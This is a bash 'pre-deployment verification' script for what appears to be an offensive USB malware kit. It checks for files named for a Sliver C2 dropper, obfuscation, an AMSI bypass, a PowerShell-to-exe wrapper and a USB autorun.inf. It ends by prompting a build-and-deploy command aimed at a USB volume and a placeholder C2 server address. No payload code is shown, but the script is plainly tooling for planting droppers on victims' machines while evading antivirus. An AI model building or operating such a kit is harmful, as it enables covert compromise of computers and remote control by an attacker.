#!/bin/bash
# Pre-Deployment Verification Checklist

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ISSUES=0

echo "[*] Pre-Deployment Verification"
echo ""

# Check files exist
echo "[1/5] Checking files..."
REQUIRED_FILES=(
	"lib/sliver-dropper-core.ps1"
	"lib/obfuscation.ps1"
	"lib/ps2exe-wrapper.py"
	"lib/amsi-bypass.ps1"
	"lib/sliver-connector-v2.ps1"
	"usb-autorun.inf"
	"build-and-deploy.sh"
)

for file in "${REQUIRED_FILES[@]}"; do
	if [ -f "$SCRIPT_DIR/$file" ]; then
		echo "  [+] $file"
	else
		echo "  [-] $file MISSING"
		ISSUES=$((ISSUES + 1))
	fi
done

# Check Python
echo ""
echo "[2/5] Checking Python..."
if command -v python3 &>/dev/null; then
	PYTHON_VER=$(python3 --version)
	echo "  [+] $PYTHON_VER"
else
	echo "  [-] python3 not found"
	ISSUES=$((ISSUES + 1))
fi

# Check PowerShell
echo ""
echo "[3/5] Checking PowerShell..."
if command -v powershell &>/dev/null; then
	PS_VER=$(powershell -NoProfile -Command '$PSVersionTable.PSVersion.Major')
	echo "  [+] PowerShell v$PS_VER"
else
	echo "  [-] powershell not found (required for compilation)"
	ISSUES=$((ISSUES + 1))
fi

# Check script permissions
echo ""
echo "[4/5] Checking permissions..."
if [ -x "$SCRIPT_DIR/build-and-deploy.sh" ]; then
	echo "  [+] build-and-deploy.sh executable"
else
	echo "  [-] build-and-deploy.sh not executable"
	echo "     Run: chmod +x build-and-deploy.sh"
	ISSUES=$((ISSUES + 1))
fi

# Check autorun.inf syntax
echo ""
echo "[5/5] Checking autorun.inf..."
if grep -q "^\[autorun\]" "$SCRIPT_DIR/usb-autorun.inf"; then
	echo "  [+] autorun.inf syntax valid"
else
	echo "  [-] autorun.inf invalid"
	ISSUES=$((ISSUES + 1))
fi

# Summary
echo ""
if [ $ISSUES -eq 0 ]; then
	echo "[+] All checks passed! Ready to deploy."
	echo ""
	echo "Next: ./build-and-deploy.sh /Volumes/USB http://your-c2:8080"
	exit 0
else
	echo "[-] $ISSUES issue(s) found. Fix and retry."
	exit 1
fi
